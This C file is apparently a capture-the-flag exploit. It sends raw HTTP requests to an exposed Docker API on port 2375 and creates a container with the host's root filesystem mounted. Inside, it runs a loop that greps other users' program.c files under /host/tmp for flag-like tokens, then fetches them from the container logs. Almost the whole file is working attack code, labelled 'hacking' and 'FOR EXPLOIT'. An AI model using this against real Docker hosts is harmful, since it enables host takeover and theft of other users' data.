#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>

#define BUFFER_SIZE 10000
#define DOCKER_CONTAINER_ID_LENGTH 64
#define MAX_URL_LENGTH 1024
#define DOCKER_PORT 2375
#define SA struct sockaddr

int create_tcp_connection(const char* host, unsigned short int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("Socket creation failed... socket() returned -1\n");
        return -1;
    }

    struct sockaddr_in servaddr;
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(host);
    servaddr.sin_port = htons(port);

    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("Connection with the server failed... connect() return non-zero exit code\n");
        return -2;
    }
    printf("Connected to %s:%hu..\n", host, port);

    return sockfd;
}

int read_line_from_socket(int fd, char line[BUFFER_SIZE]) {
    char current = '\0';
    int idx = 0;
    while (current != '\n') {
        read(fd, &current, 1);
        line[idx++] = current;
    }
    line[idx] = 0;
    return idx;
}

bool starts_with(const char *prefix, const char *str)
{
    size_t prefix_length = strlen(prefix), str_length = strlen(str);
    return str_length < prefix_length ? false : memcmp(prefix, str, prefix_length) == 0;
}

void print_hex_buffer(const char* buffer, unsigned int length) {
    for (int i = 0; i < length; i++) {
        char c = buffer[i];
        if (c >= 32 || c == '\n' || c == '\r') {
            printf("%c", c);
        } else {
            printf("\\x%02X", c);
        }
    }
}

unsigned long read_http_response(int fd, char result[BUFFER_SIZE]) {
    char tmp_buffer[2];

    // 1. Read headers: Transfer-Encoding and Content-Length are the most important ones
    char line[BUFFER_SIZE];

    bool chunked = false;
    int content_length = 0;
    while (true) {
        read_line_from_socket(fd, line);
        printf("< %s", line);
        if (strlen(line) <= 2) {
            break;
        }
        if (starts_with("Transfer-Encoding: chunked", line)) {
            chunked = true;
        }
        if (starts_with("Content-Length", line)) {
            sscanf(line + strlen("Content-Length: "), "%d", &content_length);
        }
    }

    // 2. Read the body
    if (chunked) {
        int chunk_size, length = 0;
        char* current = result;
        do {
            read_line_from_socket(fd, line);
            sscanf(line, "%X", &chunk_size);
            read(fd, current, chunk_size);
            current += chunk_size;
            length += chunk_size;

            // Read \r \n
            read(fd, tmp_buffer, 2);
        } while (chunk_size);
        return length;
    }

    if (content_length) {
        read(fd, result, content_length);
        *(result + content_length) = 0;
        return content_length;
    }

    return 0;
}

int send_http_request_get(const char* host, unsigned short int port, const char* url, char result[BUFFER_SIZE]) {
    int fd = create_tcp_connection(host, port);
    if (fd < 0) {
        return fd;
    }

    char data[BUFFER_SIZE];
    snprintf(data, BUFFER_SIZE - 1, "GET %s HTTP/1.1\nHost: %s\n\n", url, host);
    write(fd, data, strlen(data));

    unsigned long len = read_http_response(fd, result);

    close(fd);
    return len;
}

int send_http_request_post(char *host, unsigned short int port, char* url, char* body, char result[BUFFER_SIZE]) {
    int fd = create_tcp_connection(host, port);
    if (fd < 0) {
        return fd;
    }

    char data[BUFFER_SIZE];
    snprintf(data, BUFFER_SIZE - 1, "POST %s HTTP/1.1\nHost: %s\nContent-type: application/json\nContent-Length: %lu\n\n%s",
             url, host, strlen(body), body);
    write(fd, data, strlen(data));

    unsigned long len = read_http_response(fd, result);

    close(fd);
    return len;
}

int extract_json_field(const char* data, const char* key, char* result) {
    char key_in_quotes[strlen(key) + 3];
    sprintf(key_in_quotes, "\"%s\"", key);

    char* position = strstr(data, key_in_quotes);
    if (!position) {
        return -1;
    }

    position += strlen(key_in_quotes);
    while (*position == ':' || *position == ' ' || *position == '"')
        position++;

    int idx = 0;
    const char* data_end = data + strlen(data);
    while (position < data_end && *position != '"') {
        result[idx++] = *position++;
    }

    result[idx] = 0;
    return idx;
}

char* docker_host = "192.168.56.2";

void create_hacking_container() {
    char result[BUFFER_SIZE];

    // 1. Create a container
    char* shell_command = "while true; do grep -oE '[A-Z0-9]{31}=' /host/tmp/*/program.c 2> /dev/null; sleep 1; done";
    char body[BUFFER_SIZE];
    sprintf(body, "{\"Image\": \"sandbox\", \"EntryPoint\": \"/bin/sh\", \"Cmd\": [\"-c\", \"%s\"], \"HostConfig\": { \"Binds\": [\"/:/host\"] }}", shell_command);
    send_http_request_post(docker_host, DOCKER_PORT, "/containers/create", body, result);
    printf("%s", result);

    char container_id[DOCKER_CONTAINER_ID_LENGTH + 1];
    extract_json_field(result, "Id", container_id);

    printf("Container id: %s\n", container_id);

    // 2. Run the container
    char run_container_url[MAX_URL_LENGTH + 1];
    snprintf(run_container_url, MAX_URL_LENGTH, "/containers/%s/start", container_id);
    send_http_request_post(docker_host, DOCKER_PORT, run_container_url, "{}", result);
    printf("%s", result);

    printf("FOR EXPLOIT:\n%s\n", container_id);
}

void get_hacking_container_output(const char* container_id) {
    char result[BUFFER_SIZE];

    char get_container_logs_url[MAX_URL_LENGTH + 1];
    snprintf(get_container_logs_url, MAX_URL_LENGTH, "/containers/%s/logs?stdout=true&stderr=true&tail=20", container_id);
    int len = send_http_request_get(docker_host, DOCKER_PORT, get_container_logs_url, result);

    print_hex_buffer(result, len);
}

int main()
{
    // INSERT YOUR CODE HERE:
    // create_hacking_container()
    // OR
    // get_hacking_container_output(<container-id>)

    // CODE //

    return 0;
}
